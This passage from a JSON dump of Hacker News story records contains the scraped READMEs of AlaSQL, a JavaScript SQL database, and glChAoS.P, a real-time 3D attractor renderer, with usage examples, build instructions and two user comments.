with SQL-99. The tests include about 2 million queries and statements. The testruns can be found in the testlog. Contributing See Contributing for details. Thanks to all the people who already contributed! License MIT - see MIT licence information Main contributors Andrey Gershun Mathias Rangel Wulff AlaSQL is an OPEN Open Source Project. This means that: Individuals making significant and valuable contributions are given commit-access to the project to contribute as they see fit. This project is more like an open wiki than a standard guarded open source project. We appreciate any and all contributions we can get. If you feel like contributing, have a look at CONTRIBUTING.md Credits Many thanks to: Zach Carter for Jison parser-generator Andrew Kent for JS SQL Parser Eli Grey for FileSaver.js SheetJS for JS XLSX Library and other people for useful tools, which make our work much easier. Related projects that have inspired us AlaX - Export to Excel with colors and formats WebSQLShim - WebSQL shim over IndexedDB (work in progress) AlaMDX - JavaScript MDX OLAP library (work in progress) Other similar projects - list of databases on JavaScript 2014-2018, Andrey Gershun (agershun@gmail.com) & Mathias Rangel Wulff (m@rawu.dk) ",
          "This is very cool. But Github tells me that the minified version is still over 400KB.<p>I really wish browsers hasn't decided against WebSQL and replaced it with IndexedDB.",
          "I am researching for a project idea I have and was actually looking up in memory SQL databases for node last night to store and sort data instead of creating a object and custom functions to filter it.<p>I came across <a href=\"https://nanosql.io/\" rel=\"nofollow\">https://nanosql.io/</a> also which I am leaning more towards. Not to the point yet to play with either yet but it seemed like nanosql had better documentation and also less issues opened on Github right now.<p>Kinda odd how when you look up things or think of things you see signs of them... Just wow'ed to see something I was looking at last night be #4 on the HN homepage... I know people talk about positivity and the law of attraction but starting to believe more and more in it where thoughts and focus becomes reality."
        ],
        "story_type": ["Normal"],
        "url": "https://github.com/agershun/alasql",
        "comments.comment_id": [18902706, 18903164],
        "comments.comment_author": ["untog", "Keverw"],
        "comments.comment_descendants": [8, 1],
        "comments.comment_time": [
          "2019-01-14T13:20:43Z",
          "2019-01-14T14:31:06Z"
        ],
        "comments.comment_text": [
          "This is very cool. But Github tells me that the minified version is still over 400KB.<p>I really wish browsers hasn't decided against WebSQL and replaced it with IndexedDB.",
          "I am researching for a project idea I have and was actually looking up in memory SQL databases for node last night to store and sort data instead of creating a object and custom functions to filter it.<p>I came across <a href=\"https://nanosql.io/\" rel=\"nofollow\">https://nanosql.io/</a> also which I am leaning more towards. Not to the point yet to play with either yet but it seemed like nanosql had better documentation and also less issues opened on Github right now.<p>Kinda odd how when you look up things or think of things you see signs of them... Just wow'ed to see something I was looking at last night be #4 on the HN homepage... I know people talk about positivity and the law of attraction but starting to believe more and more in it where thoughts and focus becomes reality."
        ],
        "id": "71252042-d581-440f-b7af-6e17f9f06dbb",
        "url_text": "AlaSQL is an open source project used on more than two million page views per month - and we appreciate any and all contributions we can get. Please help out. Have a question? Ask on Stack Overflow using the \"alasql\" tag. AlaSQL - ( la SQL ) [l skju:l] - is an open source SQL database for JavaScript with a strong focus on query speed and data source flexibility for both relational data and schemaless data. It works in the web browser, Node.js, and mobile apps. This library is designed for: Fast in-memory SQL data processing for BI and ERP applications on fat clients Easy ETL and options for persistence by data import / manipulation / export of several formats All major browsers, Node.js, and mobile applications We focus on speed by taking advantage of the dynamic nature of JavaScript when building up queries. Real-world solutions demand flexibility regarding where data comes from and where it is to be stored. We focus on flexibility by making sure you can import/export and query directly on data stored in Excel (both .xls and .xlsx), CSV, JSON, TAB, IndexedDB, LocalStorage, and SQLite files. The library adds the comfort of a full database engine to your JavaScript app. No, really - it's working towards a full database engine complying with most of the SQL-99 language, spiced up with additional syntax for NoSQL (schema-less) data and graph networks. Traditional SQL Table /* create SQL Table and add data */ alasql(\"CREATE TABLE cities (city string, pop number)\"); alasql(\"INSERT INTO cities VALUES ('Paris',2249975),('Berlin',3517424),('Madrid',3041579)\"); /* execute query */ var res = alasql(\"SELECT * FROM cities WHERE pop < 3500000 ORDER BY pop DESC\"); // res = [ { \"city\": \"Madrid\", \"pop\": 3041579 }, { \"city\": \"Paris\", \"pop\": 2249975 } ] Live Demo Array of Objects var data = [ {a: 1, b: 10}, {a: 2, b: 20}, {a: 1, b: 30} ]; var res = alasql('SELECT a, SUM(b) AS b FROM ? GROUP BY a',[data]); // res = [ { \"a\": 1, \"b\": 40},{ \"a\": 2, \"b\": 20 } ] Live Demo Spreadsheet // file is read asynchronously (Promise returned when SQL given as array) alasql(['SELECT * FROM XLS(\"./data/mydata\") WHERE lastname LIKE \"A%\" and city = \"London\" GROUP BY name ']) .then(function(res){ console.log(res); // output depends on mydata.xls }).catch(function(err){ console.log('Does the file exist? There was an error:', err); }); Bulk Data Load alasql(\"CREATE TABLE example1 (a INT, b INT)\"); // alasql's data store for a table can be assigned directly alasql.tables.example1.data = [ {a:2,b:6}, {a:3,b:4} ]; // ... or manipulated with normal SQL alasql(\"INSERT INTO example1 VALUES (1,5)\"); var res = alasql(\"SELECT * FROM example1 ORDER BY b DESC\"); console.log(res); // [{a:2,b:6},{a:1,b:5},{a:3,b:4}] If you are familiar with SQL it should come as no surprise that proper use of indexes on your tables is essential to get good performance. Installation yarn add alasql # yarn npm install alasql # npm npm install -g alasql # global installation for command line tools For the browser: include alasql.min.js <script src=\"https://cdn.jsdelivr.net/npm/alasql@1.7\"></script> Getting started See the \"Getting started\" section of the wiki More advanced topics are covered in other wiki sections like \"Data manipulation\" and in questions on Stack Overflow Other links: Documentation: Github wiki Library CDN: jsDelivr.com Feedback: Open an issue Try online: Playground Website: alasql.org Please note All contributions are extremely welcome and greatly appreciated(!) - The project has never received any funding and is based on unpaid voluntary work: We really (really) love pull requests The AlaSQL project depends on your contribution of code and may have bugs. So please, submit any bugs and suggestions as an issue. Please check out the limitations of the library. Performance AlaSQL is designed for speed and includes some of the classic SQL engine optimizations: Queries are cached as compiled functions Joined tables are pre-indexed WHERE expressions are pre-filtered for joins See more performance-related info on the wiki Features you might like Traditional SQL Use \"good old\" SQL on your data with multiple levels of: JOIN, VIEW, GROUP BY, UNION, PRIMARY KEY, ANY, ALL, IN, ROLLUP(), CUBE(), GROUPING SETS(), CROSS APPLY, OUTER APPLY, WITH SELECT, and subqueries. The wiki lists supported SQL statements and keywords. User-Defined Functions in your SQL You can use all benefits of SQL and JavaScript together by defining your own custom functions. Just add new functions to the alasql.fn object: alasql.fn.myfn = function(a,b) { return a*b+1; }; var res = alasql('SELECT myfn(a,b) FROM one'); You can also define your own aggregator functions (like your own SUM(...)). See more in the wiki Compiled statements and functions var ins = alasql.compile('INSERT INTO one VALUES (?,?)'); ins(1,10); ins(2,20); See more in the wiki SELECT against your JavaScript data Group your JavaScript array of objects by field and count number of records in each group: var data = [{a:1,b:1,c:1},{a:1,b:2,c:1},{a:1,b:3,c:1}, {a:2,b:1,c:1}]; var res = alasql('SELECT a, COUNT(*) AS b FROM ? GROUP BY a', [data] ); See more ideas for creative data manipulation in the wiki JavaScript Sugar AlaSQL extends \"good old\" SQL to make it closer to JavaScript. The \"sugar\" includes: Write Json objects - {a:'1',b:@['1','2','3']} Access object properties - obj->property->subproperty Access object and arrays elements - obj->(a*1) Access JavaScript functions - obj->valueOf() Format query output with SELECT VALUE, ROW, COLUMN, MATRIX ES5 multiline SQL with var SQL = function(){/*SELECT 'MY MULTILINE SQL'*/} and pass instead of SQL string (will not work if you compress your code) Read and write Excel and raw data files You can import from and export to CSV, TAB, TXT, and JSON files. File extensions can be omitted. Calls to files will always be asynchronous so multi-file queries should be chained: var tabFile = 'mydata.tab'; alasql.promise([ \"SELECT * FROM txt('MyFile.log') WHERE [0] LIKE 'M%'\", // parameter-less query [ \"SELECT * FROM tab(?) ORDER BY [1]\", [tabFile] ], // [query, array of params] \"SELECT [3] AS city,[4] AS population FROM csv('./data/cities')\", \"SELECT * FROM json('../config/myJsonfile')\" ]).then(function(results){ console.log(results); }).catch(console.error); Read SQLite database files AlaSQL can read (but not write) SQLite data files using SQL.js library: <script src=\"alasql.js\"></script> <script src=\"sql.js\"></script> <script> alasql([ 'ATTACH SQLITE DATABASE Chinook(\"Chinook_Sqlite.sqlite\")', 'USE Chinook', 'SELECT * FROM Genre' ]).then(function(res){ console.log(\"Genres:\",res.pop()); }); </script> sql.js calls will always be asynchronous. AlaSQL works in the console - CLI The node module ships with an alasql command-line tool: $ npm install -g alasql ## install the module globally $ alasql -h ## shows usage information $ alasql \"SET @data = @[{a:'1',b:?},{a:'2',b:?}]; SELECT a, b FROM @data;\" 10 20 [ 1, [ { a: 1, b: 10 }, { a: 2, b: 20 } ] ] $ alasql \"VALUE OF SELECT COUNT(*) AS abc FROM TXT('README.md') WHERE LENGTH([0]) > ?\" 140 // Number of lines with more than 140 characters in README.md More examples are included in the wiki Features you might love AlaSQL D3.js AlaSQL plays nice with d3.js and gives you a convenient way to integrate a specific subset of your data with the visual powers of D3. See more about D3.js and AlaSQL in the wiki AlaSQL Excel AlaSQL can export data to both Excel 2003 (.xls) and Excel 2007 (.xlsx) formats with coloring of cells and other Excel formatting functions. AlaSQL Meteor Meteor is amazing. You can query directly on your Meteor collections with SQL - simple and easy. See more about Meteor and AlaSQL in the wiki AlaSQL Angular.js Angular is great. In addition to normal data manipulation, AlaSQL works like a charm for exporting your present scope to Excel. See more about Angular and AlaSQL in the wiki AlaSQL Google Maps Pinpointing data on a map should be easy. AlaSQL is great to prepare source data for Google Maps from, for example, Excel or CSV, making it one unit of work for fetching and identifying what's relevant. See more about Google Maps and AlaSQL in the wiki AlaSQL Google Spreadsheets AlaSQL can query data directly from a Google spreadsheet. A good \"partnership\" for easy editing and powerful data manipulation. See more about Google Spreadsheets and AlaSQL in the wiki Miss a feature? Take charge and add your idea or vote for your favorite feature to be implemented: Limitations Please be aware that AlaSQL has bugs. Beside having some bugs, there are a number of limitations: AlaSQL has a (long) list of keywords that must be escaped if used for column names. When selecting a field named key please write SELECT `key` FROM ... instead. This is also the case for words like `value`, `read`, `count`, `by`, `top`, `path`, `deleted`, `work` and `offset`. Please consult the full list of keywords. It is OK to SELECT 1000000 records or to JOIN two tables with 10000 records in each (You can use streaming functions to work with longer datasources - see test/test143.js) but be aware that the workload is multiplied so SELECTing from more than 8 tables with just 100 rows in each will show bad performance. This is one of our top priorities to make better. Limited functionality for transactions (supports only for localStorage) - Sorry, transactions are limited, because AlaSQL switched to more complex approach for handling PRIMARY KEYs / FOREIGN KEYs. Transactions will be fully turned on again in a future version. A (FULL) OUTER JOIN and RIGHT JOIN of more than 2 tables will not produce expected results. INNER JOIN and LEFT JOIN are OK. Please use aliases when you want fields with the same name from different tables (SELECT a.id AS a_id, b.id AS b_id FROM ?). At the moment AlaSQL does not work with JSZip 3.0.0 - please use version 2.x. JOINing a sub-SELECT does not work. Please use a with structure (Example here) or fetch the sub-SELECT to a variable and pass it as an argument (Example here). AlaSQL uses the FileSaver.js library for saving files locally from the browser. Please be aware that it does not save files in Safari 8.0. There are probably many others. Please help us fix them by submitting an issue. Thank you! How To Use AlaSQL to convert data from CSV to Excel ETL example: alasql([ 'CREATE TABLE IF NOT EXISTS geo.country', 'SELECT * INTO geo.country FROM CSV(\"country.csv\",{headers:true})', 'SELECT * INTO XLSX(\"asia\") FROM geo.country WHERE continent_name = \"Asia\"' ]).then(function(res){ // results from the file asia.xlsx }); Use AlaSQL as a Web Worker AlaSQL can run in a Web Worker. Please be aware that all interaction with AlaSQL when running must be async. From the browser thread, the browser build alasql-worker.min.js automagically uses Web Workers: <script src=\"alasql-worker.min.js\"></script> <script> var arr = [{a:1},{a:2},{a:1}]; alasql([['SELECT * FROM ?',[arr]]]).then(function(data){ console.log(data); }); </script> Live Demo. The standard build alasql.min.js will use Web Workers if alasql.worker() is called: <script src=\"alasql.min.js\"></script> <script> alasql.worker(); alasql(['SELECT VALUE 10']).then(function(res){ console.log(res); }).catch(console.error); </script> Live Demo. From a Web Worker, you can import alasql.min.js with importScripts: importScripts('alasql.min.js'); Webpack, Browserify, Vue and React (Native) When targeting the browser, several code bundlers like Webpack and Browserify will pick up modules you might not want. Here's a list of modules that AlaSQL may require in certain environments or for certain features: Node.js fs net tls request path React Native react-native react-native-fs react-native-fetch-blob Vertx vertx Agonostic XLSX/XLS support cptable jszip xlsx cpexcel es6-promise Webpack There are several ways to handle AlaSQL with Webpack: IgnorePlugin Ideal when you want to control which modules you want to import. var IgnorePlugin = require(\"webpack\").IgnorePlugin; module.exports = { ... // Will ignore the modules fs, path, xlsx, request, vertx, and react-native modules plugins:[new IgnorePlugin(/(^fs$|cptable|jszip|xlsx|^es6-promise$|^net$|^tls$|^forever-agent$|^tough-cookie$|cpexcel|^path$|^request$|react-native|^vertx$)/)] }; module.noParse As of AlaSQL 0.3.5, you can simply tell Webpack not to parse AlaSQL, which avoids all the dynamic require warnings and avoids using eval/clashing with CSP with script-loader. Read the Webpack docs about noParse ... //Don't parse alasql {module:noParse:[/alasql/]} script-loader If both of the solutions above fail to meet your requirements, you can load AlaSQL with script-loader. //Load alasql in the global scope with script-loader import \"script!alasql\" This can cause issues if you have a CSP that doesn't allow eval. Browserify Read up on excluding, ignoring, and shimming Example (using excluding) var browserify = require(\"browserify\"); var b = browserify(\"./main.js\").bundle(); //Will ignore the modules fs, path, xlsx [\"fs\",\"path\",\"xlsx\", ... ].forEach(ignore => { b.ignore(ignore) }); Vue For some frameworks (lige Vue) alasql cant access XLSX by it self. We recommend handeling it by including AlaSQL the following way: import XLSX from 'xlsx'; alasql.utils.isBrowserify = false; alasql.utils.global.XLSX = XLSX; jQuery Please remember to send the original event, and not the jQuery event, for elements. (Use event.originalEvent instead of myEvent) JSON-object You can use JSON objects in your databases (do not forget use == and !== operators for deep comparison of objects): alasql> SELECT VALUE {a:'1',b:'2'} {a:1,b:2} alasql> SELECT VALUE {a:'1',b:'2'} == {a:'1',b:'2'} true alasql> SELECT VALUE {a:'1',b:'2'}->b 2 alasql> SELECT VALUE {a:'1',b:(2*2)}->b 4 Try AlaSQL JSON objects in Console [sample](http://alasql.org/console?drop table if exists one;create table one;insert into one values {a:@[1,2,3],c:{e:23}}, {a:@[{b:@[1,2,3]}]};select * from one) Experimental Useful stuff, but there might be dragons Graphs AlaSQL is a multi-paradigm database with support for graphs that can be searched or manipulated. // Who loves lovers of Alice? var res = alasql('SEARCH / ANY(>> >> #Alice) name'); console.log(res) // ['Olga','Helen'] See more in the wiki localStorage and DOM-storage You can use browser localStorage and DOM-storage as a data storage. Here is a sample: alasql('CREATE localStorage DATABASE IF NOT EXISTS Atlas'); alasql('ATTACH localStorage DATABASE Atlas AS MyAtlas'); alasql('CREATE TABLE IF NOT EXISTS MyAtlas.City (city string, population number)'); alasql('SELECT * INTO MyAtlas.City FROM ?',[ [ {city:'Vienna', population:1731000}, {city:'Budapest', population:1728000} ] ]); var res = alasql('SELECT * FROM MyAtlas.City'); Try this sample in jsFiddle. Run this sample two or three times, and AlaSQL store more and more data in localStorage. Here, \"Atlas\" is the name of localStorage database, where \"MyAtlas\" is a memory AlaSQL database. You can use localStorage in two modes: SET AUTOCOMMIT ON to immediate save data to localStorage after each statement or SET AUTOCOMMIT OFF. In this case, you need to use COMMIT statement to save all data from in-memory mirror to localStorage. Plugins AlaSQL supports plugins. To install a plugin you need to use the REQUIRE statement. See more in the wiki Alaserver - simple database server Yes, you can even use AlaSQL as a very simple server for tests. To run enter the command: then open http://127.0.0.1:1337/?SELECT%20VALUE%20(2*2) in your browser Warning: Alaserver is not multi-threaded, not concurrent, and not secured. Tests Regression tests AlaSQL currently has over 1200 regression tests, but they only cover of the codebase. AlaSQL uses mocha for regression tests. Install mocha and run or open test/index.html for in-browser tests (Please serve via localhost with, for example, http-server). Tests with AlaSQL ASSERT from SQL You can use AlaSQL's ASSERT operator to test the results of previous operation: CREATE TABLE one (a INT); ASSERT 1; INSERT INTO one VALUES (1),(2),(3); ASSERT 3; SELECT * FROM one ORDER BY a DESC; ASSERT [{a:3},{a:2},{a:1}]; SQLLOGICTEST AlaSQL uses SQLLOGICTEST to test its compatibility with SQL-99. The tests include about 2 million queries and statements. The testruns can be found in the testlog. Contributing See Contributing for details. Thanks to all the people who already contributed! License MIT - see MIT licence information Main contributors Andrey Gershun Mathias Rangel Wulff AlaSQL is an OPEN Open Source Project. This means that: Individuals making significant and valuable contributions are given commit-access to the project to contribute as they see fit. This project is more like an open wiki than a standard guarded open source project. We appreciate any and all contributions we can get. If you feel like contributing, have a look at CONTRIBUTING.md Credits Many thanks to: Zach Carter for Jison parser-generator Andrew Kent for JS SQL Parser Eli Grey for FileSaver.js SheetJS for JS XLSX Library and other people for useful tools, which make our work much easier. Related projects that have inspired us AlaX - Export to Excel with colors and formats WebSQLShim - WebSQL shim over IndexedDB (work in progress) AlaMDX - JavaScript MDX OLAP library (work in progress) Other similar projects - list of databases on JavaScript 2014-2018, Andrey Gershun (agershun@gmail.com) & Mathias Rangel Wulff (m@rawu.dk) ",
        "_version_": 1718527382058434560
      },
      {
        "story_id": [21432480],
        "story_author": ["ivank"],
        "story_descendants": [27],
        "story_score": [76],
        "story_time": ["2019-11-03T06:14:07Z"],
        "story_title": "glChAoS.P: Real-time 3D strange attractors scout and hypercomplex fractals",
        "search": [
          "glChAoS.P: Real-time 3D strange attractors scout and hypercomplex fractals",
          "https://github.com/BrutPitt/glChAoS.P",
          "glChAoS.P wglChAoS.P - Ver 1.5.3 glChAoS.P / wglChAoS.P opengl / webgl Chaotic Attractors of Slight (dot) Particles RealTime 3D Strange Attractors scout on GPU The program also explores other chaotic-objects like hypercomplex fractals (IIM algorithm) and DLA3D JetBrains supports glChAoS.P wglChAoS.Pmany thanks to JetBrains for donating o.s.license for all their excellent products All available releases ==> Release Notes (what's new) Desktop - v.1.5.3 glChAoS.P - DeskTop - binaries available Windows / Linux / Mac OS WebGL - v.1.5.3 wglChAoS.P - WebG 2 via webAssembly - live / online using your browser - also for mobile devices You can select Advanced Mode check box (default) or deselect it (Standard Mode) for low resources devices (mobiles/tablet/smartphones) You can also to explore any single attractor, interactively, staring directly from web-page, using Explore button near/below any attractor formula: Attractors Formulas WebGL release is a more limited/lightened version, but frequently updated/rebuilt with last commits To view all \"chaotic-objects\" currently inserted in current release, follow the link: Attractors Formulas *any single object can be explored interactively via WebGL/WebAssembly directly from site. Latest features from ver.1.5.3 TransformFeedback multiDot particles emitter Now all dp/dt attractors (yellow tag) have an additional new emitter type to visualize them in a progressive way and/or with multiDot (spray) effect.\\ Is also possible to travel, in first person (cockpit view), within the particles, following the evolution of the attractors. Lorenz Attractor - click on image to \"explore\" it in WebGL use \"v\" key or \"cockpit\" button (from Attractors tools window) to switch to subjective view (on right) New menu is available to adjust these settings: 1) Panoramic/CockPit dots/s: different emitter speed for any view 2) Number of dots for each step, real dots/s emitted are: dots/s * Emit# 3) Multiplication factor of initial radial random speed 4) Air friction/deceleration 5) Point size: there are 3 different \"pointSize\" for: singleDot emitter, multiDot emitter and cockpitView 6) Particles LifeTime, in sec. 7) LifeTime attenuation: when the lifeTime ends, in blending mode, the particle attenuates the intensity of this factor, any second 8) Wind direction and intensity (in units/s) 9) Gravity/Acceleration direction and intensity (in units/s) A) Toggle cockpit view and related settings (following controls) B) Smoothing distance: in blending mode attenuates the intensity of near dots by distance C) Clipping distance: skip to draw closer particles D) PiP (Picture In Picture) feature E) TagretView is the current emitted dot, PointOfView is positioned on the wake: it adjusts the distance from head (it follows the attractor direction). F) Move back the PoV: it follows the vector PoV -> TGT G) Rotate the cam around TagretView, or better: around attractor head (last emitted dot), use reset to reposition the cam H) Move forward the TagretView position Youtube Video Simulating a comet's journey in Lorenz attractor Voyage in Multi-Chua II attractor ver.1.4.2 feature: 11 unpublished attractor types: PopCorn, Mira, Hopalong and... An absolutely personal and original \"transformations\" in 3D/4D of famous 2D attractors: PopCorn, Morrone 4D transf. (ssss) Martin, Morrone 4D transf. PopCorn, Morrone 4D transf. (scsc) Mira, , Morrone 4D transf. Mira, Morrone 3D transf. Hopalong, Morrone 4D transf. Full descriptions, math formulas and code in the relative webpage: PopCorn, Mira, Hopalong and... *now any single attractor is also explorable interactively via WebGL/WebAssembly directly from site. Particle System rendering features 100M of particles in minus of 1.6 GByte of VRAM.. up to 265M (4G VRAM): Slight (dot) Particles only a vec4 (4-float) per vertex for position and color Rendering: RealTime Surface Reconstruction / Shadows / Ambient Occlusion Light Models: Phong / Blinn-Phong / GGX Glow effects: Gaussian Blur / bilateral deNoise with threshold / Gaussian + deNoise Anti-aliasing: FXAA Image adjustment: Bright / Contrast / Gamma / Exposure / ToneMapping With Billboard and PointSprite techniques 3D DLA (Diffusion Limited Aggregation) - DLA3D Video Example This is an integrated version of more simple my DLAf-optimized repo that I used in glChAoS.P / wglChAoS.P for large-scale DLA3D growth, with possibility to export/import to/from PLY format and to continue a previous rendering. Rendering models with Aizawa attractor - Video Example Alpha Blending Solid Dots Further rendering engine improvement (from ver. >= 1.3.x) - Rendering Video Example DualPass rendering: Z-buffer surface reconstruction DualPass + Ambient Occlusion DualPass + AO + Shadows DualPass + AO + Shadows + mixed AlphaBlending *features also available in WebGL advanced version wglChAoS.P - WebGL2 online version This is a WebGL2 / WebAssembly lightened LIVE / ONLINE version of glChAoSP and Supports touch screen for mobile devices, smartphones and tablets Go to wglChAoS.P - LIVE / ONLINE starting page wglChAoS.P Advanced Mode - WebGL2 with new rendering engine Starting from ver 1.3.2, also WebGL have new rendering engine: dual pass accurate rendering, shadows and ambient occlusion *Advanced Mode not available/tested still for mobile devices Hypercomplex fractals like attractors - via IIM (Inverse Iterations Method) hypercomplex fractals hypercomplex fractals glChAoS.P features glChAoS.P is a 3D realtime Particle System with some unique features: 100M of particles in minus of 1.6 GByte of VRAM.. until 265M (4G VRAM): Slight (dot) Particles only 4-float (vec4) per vertex: position and color PointSprite and Billboard particles types 3D blended/solid/lighted particles Single dot or DualPass rendering (surface reconstruction from zBuffer) Shadows and AmbientOcclusion Light models: Phong / Blinn-Phong / GGX Distance attenuation on Size an Alpha channel Full customizable colors, with several color palettes Customizable glow effects: Gaussian Blur / bilateral deNoise with threshold / Gaussian + deNoise Customizable FXAA filter Motion blur Post processing image correction: gamma exposure brightness contrast toneMapping / HDR ... and more For more usage info: glChAoS.P info Some screenshots from different operating systems Windows Windows Viewports Linux Mac OS X Hardware required: glChAoS.P - GPU with OpenGL 4.1 or higher wglChAoS.P - Browser with WebGL2 capabilities (FireFox, Chrome or Chromium based browsers) Theoretically all graphics card that supports OpenGL 4.0 supports also OpenGL 4.5, depends only from drivers (and O.S.) About the GPUs that support the OpenGL 4.5 (with appropriate drivers and OS permitting): NVidia starting from GT/GTX 4xx series AMD starting from HD 5xxx series Intel starting from Ivy Bridge/Bay Trail CPUs (with HD 4000/2500 graphics) Hardware recommended: GPU starting from AMD HD 7970 / NVidia GTX 670 or with better performance CPU with 2 or more cores About performance Glow effects, mostly with sigma > 5, and DualPass/Shadows/AO requires expensive calculations in terms of performance If you have slow performance try, in this order: Disable DualPass rendering and/or AO and/or Shadows Disable GlowEffects and/or FXAA Prefer Pointsprite: on AMD and Intel GPU (sensible difference of performance) Decrease number of particles buffer < 3000 Decrease point size (if you can) try squared 1024x1024 (power of 2) window size (from Settings panel) Supported Operating systems: Microsoft Windows Linux/Unix Mac OS X Android via webBrowser (wglChAoS.P WebGL/webAssembly, lightned version) Tested Operating System Versions: Microsoft Windows 7/8.x/10 Linux distributions: Ubuntu 16.04 -> 20.04, Fedora 27 -> 32 Mac OS 10.14 (Mojave), 10.15 (Catalina) Android 5/6/7/8/9 with Firefox and Chrome Executables No installation program is provided: just clone it form github or download the archive and decompress it in a folder whatever: only the internal directories structure must be preserved. For Windows and Linux glChAoSP uses OpenGL 4.5 with AZDO (Approaching Zero Driver Overhead) and a separate thread (multithread) emitter/generator of particles with memory mapped directly on GPU vRAM. On Mac OS X, for a limitation of the OS (from Mojave Apple have deprecated OpenGL) there is a downgraded version that use OpenGL 4.1 (higher possible) with a separate thread emitter/generator that uses the conventional CPU memory. Are provided executable for the followings OS: Windows glChAoSP.exe and glChAoSP_32.exe: native executable (64 and 32 bit) are provided for OpenGL >= 4.5: Preferably use the 64-bit version. (you can recompile it, with appropriate define, to obtain an OpenGL 4.1 compliant) glChAoSP_viewports.exe: beta version of multiple viewports is also provided (floating GUI windows that can go out outside of main Viewport/Window): (only 64 bits). This is a great version, solid beta and full functional, but based on a under development version of ImGui library. Linux glChAoSP_Linux: native executable (64 bit) is provided for OpenGL >= 4.5: it was tested on Fedora and Ubuntu LTS. (you can recompile it, with appropriate define, to obtain an OpenGL 4.1 compliant) Take care to have installed OpenGL library, whereas libX11 libXext should already be installed. After clone, copy or decompression, take care that executable bit of the file glChAoSP_Linux is active (chmod +x). Use glChAoSP_Linux.sh to launch it from fileBrowsers like Nautilus or Caja. wine The Windows executable, 32/64 bit, works fine also in wine 3.xx with no evident loss of performance Mac OS glChAoSP_OSX: native executable (64 bit) is provided for OpenGL 4.1 From Finder click on applescript: glChAoSP_OSX.app, or form command line type directly the command: ./glChAoSP_OSX It was tested on OS X ver 10.14 (Mojave) only, although with subsequent updates and different library versions you may need to rebuild it. Read Build/CMake sections for further information. NOTE: For Windows and Linux glChAoS.P uses OpenGL 4.5 with AZDO (Approaching Zero Driver Overhead) and a separate thread (multithread) emitter/generator of particles with memory mapped directly on GPU vRAM. On Mac OS, for a limitation of the OS (from Mojave Apple have deprecated OpenGL) there is a downgraded version, that use OpenGL 4.1 (higher possible) with a separate thread emitter/generator that use the conventional CPU memory. Furthers build option are provided: Use OpenGL 4.1 also on Windows and Linux. Single thread version. To build glChAoS.P Build requirements Compilers with full C++14 standard required CMake 3.15 or higher Boost Library to build DLA3D (Diffusion Limited Aggregation) object exploration, (or uncomment DISABLE_DLA3D in CMake file to disable it) it has been replaced with nanoflann header-only (enclosed) Tested Compilers Microsoft Visual Studio 2019/2017/2015 (Platform Toolset v.142/141/140: it does not work with previous releases) MinGW (64bit) v.9 CLang from v.5 to current GNU C++ from v.5 to current CMake In the folder ./src there is the CmakeLists.txt, use this folder as base directory. Read below more about your OS. GLFW Library Enclosed 32/64bit built library for Windows, and 64bit for Linux and OS X When build glChAoSP, compiler looks for GLFW library in the follows path: src/src/libs/glfw/buildLinux (Linux) src/src/libs/glfw/buildOSX (OSX) src/src/libs/glfw/buildWin (Windows) You need to delete it, and/or modify the CMake file, to use personal ones version. In this case you need to have installed GLFW Library, ver 3.3 or higher, or re-build the enclosed version in ./src/src/libs/glfw folder. Build glChAoS.P in Windows Windows user needs of Visual Studio 2019 (it works also wit VS 2017/2015, but is need to change appropriate Platform Toolset and/or Windows SDK version that you have installed). In alternative, CMake 3.10 (or higher) for other compilers toolchain (non tested, but it should work). Microsoft Visual Studio VS solution In the folder ./src/msBuilds there is the solution project for use with Visual Studio 2017/2019. (check appropriate Platform Toolset and/or Windows SDK version that you have installed) You can use also LLVM CLang to build glChAoS.P from Visual Studio: you can use the LLVM plugin (after to have installed clang, in windows) and simply change the toolchain in Properties -> General -> Platform Toolset The current VisualStudio solution refers to my environment variable RAMDISK (R:), and subsequent VS intrinsic variables to generate binary output: $(RAMDISK)\\$(MSBuildProjectDirectoryNoRoot)\\$(DefaultPlatformToolset)\\$(Platform)\\$(Configuration)\\ Even without a RAMDISK variable, executable and binary files are outputted in base to the values of these VS variables, starting from root of current drive. VS with CMakeFile.txt and CMakeSettings.json (testing fase - VS2019 only) Open ./src folder in vs2019 you can build both Emscripten / CLang inside Visual Studio CMake You can use CMake to compile with CLang / MinGW, using mingw_make or ninja tool. NOTE: To build viewports version you need to add -DGLAPP_IMGUI_VIEWPORT to compiler flags, or uncomment it in appDefines.h Build glChAoS.P in Linux Tools required Linux users need to install the GCC C/C++ v.5 or higher (or clang v.5 or higher) compilers and associated tools such as make and CMake (need v3.10 or higher). To install gcc C/C++: Debian, Ubuntu: sudo apt-get install build-essential cmake cmake-qt-gui Fedora, RedHat: sudo dnf install make gcc-c++ cmake cmake-gui You need also to have installed OpenGL library and relative development package: libgl1-mesa libgl1-mesa-dev (Ubuntu) or mesa-libGL mesa-libGL-devel (Fedora). Build Form a Terminal window, just launch sh build_glChAoSP.sh script (from ./src folder) to build glChAoSP, it first runs cmake with appropriate parameters and then starts make to build glChAoSP_Linux executable: it will stored in parent folder (../). the script uses the enclosed built version of GLFW Another script, buildLinux.sh, is provided (as helper) to re-build GLFW: it calls buildGLFW.sh (to build/re-build GLFW) and build_glChAoSP.sh sequentially. To build/rebuild GLFW from enclosed sources you must have installed also development packages: libx11-dev libxext-dev (Ubuntu) or libX11-devel libXext-devel (Fedora). *(documentation: https://github.com/glfw/glfw) Build glChAoS.P in Mac OS Tools required Mac users must have installed Xcode and the Command Line Tools, also CMake 3.10 or higher is necessary. Build Form a Terminal window, just launch sh build_glChAoSP.sh script (from ./src folder) to build glChAoSP, it first runs cmake with appropriate parameters and then starts make to build glChAoSP_OSX executable: it will stored in parent folder (../) the script uses the enclosed built version of GLFW Another script, buildOSX.sh, is provided (as helper) to re-build GLFW: it calls buildGLFW.sh OSX (to build/re-build GLFW) and build_glChAoSP.sh sequentially. *(documentation: https://github.com/glfw/glfw) Build wglChAoS.P with EMSCRIPTEN - WebGL via WebAssembly The CMake file is able to build also an EMSCRIPTEN version, obviously you need to have installed EMSCRIPTEN SDK on your computer (1.38.20 1.38.28 1.38.40 or higher). Use emsCMakeGen.cmd or emsCMakeGen.sh from ./src directory, or look inside it, to pass appropriate defines/parameters to CMake command line. emsCMakeGen need to know the location of EMSDK, and the \"build-type\" object to create. For example, run: emsCMakeGen.sh /opt/emsdk/emscripten/1.38.20 Debug|Release|RelWithDebInfo|MinSizeRel wglChAoSP|wglChAoSP_lowres emsCMakeGen.cmd C:\\emsdk\\emscripten\\1.38.20 Debug|Release|RelWithDebInfo|MinSizeRel To build the EMSCRIPTEN version, in Windows, with CMake, need to have mingw32-make in your computer and in the search PATH (only the make utility is enough) or Ninja. Currently all the shell/cmd scripts use Ninja to build wglChAoS.P 